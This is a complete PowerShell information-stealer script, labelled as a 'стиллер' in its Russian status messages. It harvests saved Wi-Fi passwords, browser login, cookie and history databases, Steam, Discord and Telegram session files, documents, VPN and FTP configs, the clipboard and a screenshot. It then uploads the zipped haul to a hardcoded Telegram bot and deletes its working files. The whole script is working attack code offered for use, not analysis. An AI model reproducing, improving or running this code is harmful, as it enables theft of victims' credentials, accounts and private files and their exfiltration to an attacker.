# --- Настраиваемый блок для текста сообщений ---
$messages = @{
    Start = "Запуск стиллера...";
    SystemCollect = "Сбор информации о системе";
    BrowsersCollect = "Сбор данных браузеров...";
    FilesCollect = "Сбор файлов...";
    GamingCollect = "Сбор данных игровых клиентов...";
    MessengersCollect = "Сбор логов мессенджеров...";
    Screenshot = "Делаем снимок экрана...";
    UserActivity = "Сбор клипборда и специфической активности...";
    NetworkCollect = "VPN/FTP данные...";
    Archive = "Архивируем данные...";
    TelegramSend = "Отправка архива в Telegram...";
    Success = "Архив успешно отправлен.";
    FailSend = "Не получилось отправить архив.";
    Finished = "Стиллер завершён.";
}

# --- Параметры Telegram ---
$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
$ChatID = "1266539824"

function WriteMsg($key) {
    Write-Host $messages[$key]
}
function Start-Execution {
    WriteMsg "Start"
    $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null

    WriteMsg "SystemCollect"
    Get-SystemInfo -OutDirectory "$tempDir\System"
    WriteMsg "BrowsersCollect"
    Get-BrowserData -OutDirectory "$tempDir\Browsers"
    WriteMsg "FilesCollect"
    Gather-Files -OutDirectory "$tempDir\Files"
    WriteMsg "GamingCollect"
    Get-GameLauncherData -OutDirectory "$tempDir\Gaming"
    WriteMsg "MessengersCollect"
    Get-MessengerData -OutDirectory "$tempDir\Messengers"
    WriteMsg "Screenshot"
    Take-Screenshot -OutFile "$tempDir\screenshot.png"
    WriteMsg "UserActivity"
    Get-UserActivity -OutDirectory "$tempDir\Activity"
    WriteMsg "NetworkCollect"
    Get-VpnFtpData -OutDirectory "$tempDir\Network"
    WriteMsg "Archive"
    $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    WriteMsg "TelegramSend"
    $ok = Send-ResultToTelegram -BotToken $BotToken -ChatID $ChatID -ZipPath $zipPath -SystemInfoPath "$tempDir\System\user_info.txt"
    if ($ok) {
        WriteMsg "Success"
    } else {
        WriteMsg "FailSend"
    }

    Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false
    Remove-Item -Path $zipPath -Force
    WriteMsg "Finished"
}

function Get-SystemInfo {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    
    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress
    $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org').Trim() } catch { "N/A" }
    $userInfo = "Username: $($env:USERNAME)" + "`r`n" +
                "ComputerName: $($env:COMPUTERNAME)" + "`r`n" +
                "Local IP: $($ipConfig.IPAddress -join ', ')" + "`r`n" +
                "External IP: $externalIp"
    $userInfo | Out-File "$OutDirectory\user_info.txt"

    Get-ComputerInfo | Out-File "$OutDirectory\computer_info.txt"
    
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File -Append "$OutDirectory\installed_programs.txt"

    try {
        $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
        $wifiData = foreach ($profile in $wifiProfiles) {
            try {
                $profileData = (netsh wlan show profile name="$profile" key=clear)
                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
                if ($password) { [PSCustomObject]@{SSID=$profile; Password=$password} }
            } catch {}
        }
        $wifiData | Format-Table -AutoSize | Out-File "$OutDirectory\wifi_passwords.txt"
    } catch {}
}

function Get-BrowserData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    
    # Expanded list of browser paths
    $browserPaths = @{
        'Google Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data";
        'Microsoft Edge' = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
        'Brave' = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";
        'Yandex' = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data";
        'Chromium' = "$env:LOCALAPPDATA\Chromium\User Data";
        'Opera' = "$env:APPDATA\Opera Software\Opera Stable";
        'Opera GX' = "$env:APPDATA\Opera Software\Opera GX Stable";
        'Vivaldi' = "$env:LOCALAPPDATA\Vivaldi\User Data";
        'Firefox' = "$env:APPDATA\Mozilla\Firefox\Profiles";
    }

    $chromiumFilters = "Login Data", "Cookies", "Web Data", "History"
    
    foreach ($browser in $browserPaths.Keys) {
        $path = $browserPaths[$browser]
        if (Test-Path $path) {
            $dest = "$OutDirectory\$browser"
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            
            if ($browser -eq 'Firefox') {
                 Get-ChildItem -Path $path -Filter "places.sqlite", "key4.db", "logins.json", "cookies.sqlite" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $dest -Force
            } else {
                # FIX: Iterate through filters one by one for Chromium-based browsers
                foreach ($filter in $chromiumFilters) {
                    Get-ChildItem -Path $path -Filter $filter -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                        if (-not $_.PSIsContainer) {
                            $profileName = $_.Directory.Name
                            $destProfilePath = "$dest\$profileName"
                            New-Item -Path $destProfilePath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                            Copy-Item -Path $_.FullName -Destination $destProfilePath -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
        }
    }
}

function Gather-Files {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            # Пропускаем папки с видео!
            Get-ChildItem -Path $dir -Force | Where-Object { $_.PSIsContainer -eq $false -or $_.Name -notmatch "видео|video" } |
                Copy-Item -Destination "$OutDirectory\Important" -Force -ErrorAction SilentlyContinue
        }
    }
    Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf -ErrorAction SilentlyContinue |
        Copy-Item -Destination "$OutDirectory\Documents" -Force -ErrorAction SilentlyContinue
}


function Get-GameLauncherData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    # Expanded list of game launchers
    $launcherPaths = @{
        'Steam' = (Get-ItemProperty -Path 'HKCU:\Software\Valve\Steam' -Name 'SteamPath' -ErrorAction SilentlyContinue).SteamPath;
        'EpicGames' = "$env:LOCALAPPDATA\EpicGamesLauncher";
        'Battle.net' = "$env:APPDATA\Battle.net";
        'Ubisoft' = "$env:LOCALAPPDATA\Ubisoft Game Launcher";
        'GOG' = "$env:LOCALAPPDATA\GOG.com";
        'Origin' = "$env:APPDATA\Origin";
        'EA Desktop' = "$env:APPDATA\EA Desktop";
    }

    foreach ($launcher in $launcherPaths.Keys) {
        $path = $launcherPaths[$launcher]
        if ($path -and (Test-Path $path)) {
            $dest = "$OutDirectory\$launcher"
            if ($launcher -eq 'Steam') {
                 New-Item -Path $dest -ItemType Directory -Force | Out-Null
                 Copy-Item -Path "$path\config" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
                 Get-ChildItem -Path $path -Filter "ssfn*" -File | Copy-Item -Destination $dest -Force
            } else {
                Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

function Get-MessengerData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    $discordPaths = @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb", "$env:APPDATA\discordptb\Local Storage\leveldb")
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            $dest = "$OutDirectory\Discord\" + ($path -split '\\')[-3]
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            Copy-Item -Path "$path\*" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    $telegramPath = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $telegramPath) {
        $dest = "$OutDirectory\Telegram"
        New-Item -Path $dest -ItemType Directory -Force | Out-Null
        Get-ChildItem -Path $telegramPath -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "D877F783D5D3*" -or $_.Name -like "map*"} | Copy-Item -Destination $dest -Force
    }
}

function Take-Screenshot {
    param($OutFile)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen(0, 0, 0, 0, $screen)
        $bitmap.Save($OutFile)
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {}
}

function Get-UserActivity {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    try { Get-Clipboard | Out-File "$OutDirectory\clipboard.txt" } catch {}
    "[Keylogger] To implement a full keylogger, a C# assembly with SetWindowsHookEx is required. This is beyond pure PowerShell." | Out-File "$OutDirectory\keylogger_status.txt"
}

function Get-VpnFtpData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null

    Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.ovpn, *.conf, *.ini -ErrorAction SilentlyContinue | Copy-Item -Destination "$OutDirectory\VPN_Configs" -Force -ErrorAction SilentlyContinue
    
    # Expanded search for FTP client data
    $ftpPaths = @("$env:APPDATA\FileZilla", "$env:APPDATA\WinSCP.ini", "$env:APPDATA\CoreFTP", "$env:APPDATA\Cyberduck", "$env:APPDATA\SmartFTP")
    $destFTP = "$OutDirectory\FTP_Clients"
    New-Item -Path $destFTP -ItemType Directory -Force | Out-Null
    foreach ($ftpPath in $ftpPaths) {
        if (Test-Path $ftpPath) { Copy-Item -Path $ftpPath -Destination $destFTP -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

function Send-ResultToTelegram {
    param (
        [string]$BotToken,
        [string]$ChatID,
        [string]$ZipPath,
        [string]$SystemInfoPath
    )
    $caption = Get-Content $SystemInfoPath | Out-String
    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
    try {
        $resp = Invoke-WebRequest -Uri $url `
            -Method Post `
            -Form @{
                chat_id = $ChatID
                caption = $caption
                document = Get-Item $ZipPath
            }
        if ($resp.StatusCode -eq 200) { return $true }
        else { return $false }
    } catch { return $false }
}




Start-Execution
